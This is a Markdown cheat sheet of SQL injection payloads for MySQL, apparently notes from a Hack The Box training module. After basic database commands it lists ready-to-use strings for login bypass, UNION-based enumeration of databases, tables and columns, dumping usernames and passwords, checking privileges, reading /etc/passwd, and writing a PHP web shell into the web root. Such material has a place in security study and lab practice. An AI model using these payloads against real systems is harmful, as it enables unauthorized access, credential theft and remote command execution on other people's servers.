# SQL Injection

## Basic Commands

### Connecting to the Database
```bash
# Connect using mysql
mysql -u root -h docker.hackthebox.eu -P 3306 -p

# List databases
SHOW DATABASES; 

# Switch to a database(users)
USE users; 
```

### Tables
```sql
# List available tables in the current database
SHOW TABLES;

# Show table(logins) properties and columns
DESCRIBE logins;
```

### Columns
```sql
# Show all columns in a table
SELECT * FROM table_name;

# Show specific columns in a table
SELECT column1, column2 FROM table_name;

# Sort by column
SELECT * FROM logins ORDER BY column_1;

# Sort by column in descending order
SELECT * FROM logins ORDER BY column_1 DESC;

# Only show the first two results
SELECT * FROM logins LIMIT 2;

# List results that meet a condition
SELECT * FROM table_name WHERE <condition>;

# List results where the name is similar to a given string
SELECT * FROM logins WHERE username LIKE 'admin%';
```

## SQL Injection Techniques
### Basic Auth Bypass
```gitignore
# Basic Auth Bypass
admin' or '1'='1

# Basic Auth Bypass with comments
admin')-- -   
```

### Union Injection
```gitignore
# Detect number of columns using ORDER BY
' order by 1-- -

# Detect number of columns using UNION
cn' UNION select 1,2,3-- -

# Basic Union injection
cn' UNION select 1,@@version,3,4-- -

# Union injection for 4 columns
UNION select username, 2, 3, 4 from passwords-- - 
```

### DB Enumeration
```gitignore
# Fingerprint MySQL with query output
SELECT @@version;  

# Fingerprint MySQL with no output
SELECT SLEEP(5);   

# List current database name
cn' UNION select 1,database(),2,3-- -  

# List all databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  

# List all tables in a specific database(dev)
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  

# List all columns in a specific table(credentials)
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  

# Dump data from a table in another database.
cn' UNION select 1, username, password, 4 from dev.credentials-- -  
```

### Privileges
```gitignore
# Find current user
cn' UNION SELECT 1, user(), 3, 4-- -   

# Check if user has admin privileges(test)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="test"-- -   

# Find all user privileges(test)
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'test'@'localhost'"-- -

# Find accessible directories via MySQL
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -   
```

### File Injection
```gitignore
# Read a local file(/etc/passwd)
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -   

# Write a string to a local file(/var/www/html/proof.txt)
select 'file written successfully!' into outfile '/var/www/html/proof.txt';   

# Upload a PHP web shell
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -   
```
